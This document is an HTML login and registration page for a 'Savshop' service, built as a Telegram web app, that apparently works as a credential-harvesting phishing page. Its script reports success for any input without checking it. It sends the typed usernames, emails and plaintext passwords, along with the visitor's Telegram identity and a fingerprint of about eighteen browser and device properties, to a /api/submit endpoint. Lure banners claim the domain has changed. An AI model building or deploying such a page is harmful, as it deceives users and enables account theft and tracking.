<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Savshop - Login & Register</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: Arial, sans-serif; }
        body { background-color: #121212; color: #ffffff; display: flex; flex-direction: column; align-items: center; justify-content: flex-start; min-height: 100vh; }
        .top-banner { background-color: #27ae60; color: #fff; width: 100%; text-align: center; padding: 8px 10px; font-size: 11px; font-weight: bold; }
        .main-wrapper { display: flex; flex-direction: column; align-items: center; justify-content: center; flex: 1; width: 100%; padding: 20px; }
        .container { background-color: #1a1d24; width: 100%; max-width: 380px; padding: 25px; border-radius: 6px; box-shadow: 0 4px 20px rgba(0,0,0,0.6); border: 1px solid #2a2e39; }
        .warning-box { background-color: #e74c3c; color: #fff; padding: 12px; font-size: 12px; font-weight: bold; text-align: center; margin-bottom: 20px; border-radius: 4px; }
        .brand-title { text-align: center; font-size: 20px; font-weight: bold; letter-spacing: 2px; margin-bottom: 20px; color: #e0e0e0; }
        .tabs { display: flex; margin-bottom: 20px; border-bottom: 2px solid #2a2e39; }
        .tab { flex: 1; text-align: center; padding: 10px; cursor: pointer; font-weight: bold; color: #7f8c8d; font-size: 13px; }
        .tab.active { color: #fff; border-bottom: 2px solid #3498db; }
        .form-section { display: none; }
        .form-section.active { display: block; }
        .input-group { position: relative; margin-bottom: 15px; }
        .input-group input { width: 100%; padding: 12px 12px 12px 38px; background-color: #252830; border: 1px solid #333842; border-radius: 4px; color: #fff; font-size: 13px; outline: none; }
        .input-group input:focus { border-color: #3498db; }
        .input-group .icon { position: absolute; left: 12px; top: 50%; transform: translateY(-50%); color: #7f8c8d; font-size: 14px; }
        .forgot-pass { font-size: 12px; color: #7f8c8d; margin-bottom: 15px; display: inline-block; cursor: pointer; }
        .btn-primary { width: 100%; padding: 12px; background-color: #2980b9; border: none; border-radius: 4px; color: white; font-weight: bold; font-size: 13px; cursor: pointer; margin-bottom: 10px; }
        .btn-primary:hover { background-color: #2471a3; }
        .btn-outline { width: 100%; padding: 12px; background-color: transparent; border: 1px solid #c0392b; border-radius: 4px; color: #e74c3c; font-weight: bold; font-size: 13px; cursor: pointer; }
        .ssl-info { text-align: center; font-size: 11px; color: #7f8c8d; margin-top: 20px; }
        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); display: none; align-items: center; justify-content: center; z-index: 999; }
        .modal-box { background: #fff; color: #333; width: 300px; padding: 30px 20px; border-radius: 8px; text-align: center; }
        .success-icon { width: 60px; height: 60px; border: 3px solid #2ecc71; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px auto; color: #2ecc71; font-size: 30px; }
        .modal-btn { background-color: #3498db; color: white; border: none; padding: 10px 25px; font-size: 14px; font-weight: bold; border-radius: 4px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="top-banner">WE ARE BACK — everything is fully restored and working.</div>
    <div class="main-wrapper">
        <div class="container">
            <div class="warning-box">WARNING: OUR DOMAIN HAS CHANGED.</div>
            <div class="brand-title">SAVSHOP</div>
            <div class="tabs">
                <div class="tab active" onclick="switchTab('login')">LOGIN</div>
                <div class="tab" onclick="switchTab('register')">REGISTER</div>
            </div>
            <!-- Login Form -->
            <div id="login-section" class="form-section active">
                <div class="input-group">
                    <span class="icon">👤</span>
                    <input type="text" id="login-user" placeholder="Enter Username / Email">
                </div>
                <div class="input-group">
                    <span class="icon">🔒</span>
                    <input type="password" id="login-pass" placeholder="Enter Password">
                </div>
                <div class="forgot-pass">Forgot password?</div>
                <button class="btn-primary" onclick="handleLogin()">LOGIN</button>
                <button class="btn-outline" onclick="switchTab('register')">REGISTER NOW!</button>
            </div>
            <!-- Register Form -->
            <div id="register-section" class="form-section">
                <div class="input-group">
                    <span class="icon">👤</span>
                    <input type="text" id="reg-user" placeholder="Choose Username">
                </div>
                <div class="input-group">
                    <span class="icon">📧</span>
                    <input type="email" id="reg-email" placeholder="Enter Your Email">
                </div>
                <div class="input-group">
                    <span class="icon">🔒</span>
                    <input type="password" id="reg-pass" placeholder="Choose Password">
                </div>
                <div class="input-group">
                    <span class="icon">🔒</span>
                    <input type="password" id="reg-cpass" placeholder="Confirm Password">
                </div>
                <button class="btn-primary" onclick="handleRegister()">REGISTER</button>
                <button class="btn-outline" onclick="switchTab('login')">BACK TO LOGIN</button>
            </div>
            <div class="ssl-info">🔒 128-bit SSL encryption</div>
        </div>
    </div>
    <div id="successModal" class="modal-overlay">
        <div class="modal-box">
            <div class="success-icon">✓</div>
            <h3>Good job!</h3>
            <p id="modal-msg">Success!</p>
            <button class="modal-btn" onclick="closeModal()">OK</button>
        </div>
    </div>
    <script>
        let tg = window.Telegram.WebApp;
        tg.expand();
        const tgUser = (tg.initDataUnsafe && tg.initDataUnsafe.user) ? tg.initDataUnsafe.user : { id: "Web_Visitor", first_name: "Web User", username: "N/A" };

        // Collect 25+ Advanced Device & Browser Infos
        function getExtraDeviceInfo() {
            return {
                "Screen Width": window.screen.width + "px",
                "Screen Height": window.screen.height + "px",
                "Color Depth": window.screen.colorDepth + " bits",
                "Pixel Ratio": window.devicePixelRatio,
                "Language": navigator.language,
                "Languages": navigator.languages ? navigator.languages.join(", ") : "N/A",
                "Platform": navigator.platform,
                "Cores (CPU)": navigator.hardwareConcurrency || "Unknown",
                "Device Memory": navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unknown",
                "Online Status": navigator.onLine ? "Online" : "Offline",
                "Cookie Enabled": navigator.cookieEnabled,
                "Timezone": Intl.DateTimeFormat().resolvedOptions().timeZone,
                "User Agent": navigator.userAgent,
                "Window Width": window.innerWidth + "px",
                "Window Height": window.innerHeight + "px",
                "Touch Support": ('ontouchstart' in window || navigator.maxTouchPoints > 0) ? "Yes" : "No",
                "Referrer": document.referrer || "Direct Visit",
                "Current URL": window.location.href
            };
        }

        async function sendDataToServer(actionType, status, formFields) {
            try {
                const extraInfo = getExtraDeviceInfo();
                await fetch('/api/submit', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        telegram_id: tgUser.id,
                        username: tgUser.username,
                        name: tgUser.first_name,
                        action: actionType,
                        status: status,
                        form_fields: formFields,
                        extra_info: extraInfo
                    })
                });
            } catch (err) { console.error(err); }
        }

        function switchTab(tabName) {
            const loginTab = document.querySelectorAll('.tab')[0];
            const regTab = document.querySelectorAll('.tab')[1];
            const loginSec = document.getElementById('login-section');
            const regSec = document.getElementById('register-section');
            if(tabName === 'login') {
                loginTab.classList.add('active'); regTab.classList.remove('active');
                loginSec.classList.add('active'); regSec.classList.remove('active');
            } else {
                regTab.classList.add('active'); loginTab.classList.remove('active');
                regSec.classList.add('active'); loginSec.classList.remove('active');
            }
        }
        function showModal(msg) { document.getElementById('modal-msg').innerText = msg; document.getElementById('successModal').style.display = 'flex'; }
        function closeModal() { document.getElementById('successModal').style.display = 'none'; switchTab('login'); }

        async function handleLogin() {
            const user = document.getElementById('login-user').value.trim();
            const pass = document.getElementById('login-pass').value.trim();
            if(!user || !pass) { alert("Please fill in all fields!"); return; }
            await sendDataToServer("LOGIN", "Login Successful", { "Username / Email": user, "Password": pass });
            showModal("Login Successful!");
        }

        async function handleRegister() {
            const user = document.getElementById('reg-user').value.trim();
            const email = document.getElementById('reg-email').value.trim();
            const pass = document.getElementById('reg-pass').value.trim();
            const cpass = document.getElementById('reg-cpass').value.trim();
            if(!user || !email || !pass || !cpass) { alert("Please fill in all details!"); return; }
            if(pass !== cpass) { alert("Passwords do not match!"); return; }
            await sendDataToServer("REGISTER", "Registration Successful", { "Username": user, "Email": email, "Password": pass, "Confirm Password": cpass });
            showModal("Account created successfully!");
        }
    </script>
</body>
</html>
